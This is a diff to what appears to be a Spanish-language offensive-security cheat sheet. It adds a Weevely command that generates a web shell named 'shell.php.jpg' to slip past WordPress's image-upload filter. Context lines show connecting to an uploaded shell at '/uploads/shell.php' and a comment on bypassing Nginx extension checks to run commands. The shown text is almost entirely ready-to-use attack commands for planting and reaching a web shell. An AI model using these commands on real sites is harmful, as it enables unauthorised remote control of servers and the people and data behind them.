@@ -107,7 +107,7 @@ La mayoría de las paginas al momento de comprometerlas encontraremos el usuario
 
 ```
 
-## Bypass Web
+## Bypass Web Weevely
 
 ```bash 
 # Byppass en Nginx, subimos el archivo con la extension que permite subir, despues en la url lo cambiamos al formato php y ejecutamos los comandos 
@@ -127,6 +127,8 @@ La mayoría de las paginas al momento de comprometerlas encontraremos el usuario
 
 ❯ weevely https://IP/uploads/shell.php password           # Otra forma de conectarse a Weevely obteniendo la Revershell
 	❯ ls                            # Listamos el contenido 
+
+❯ weevely generate password /root/shell.php.jpg           # Creamos una revershell con extension 'php.jpg' para pasar el filtro en WordPress de cargar imagenes 
 ```
 
 ## RCE en Web
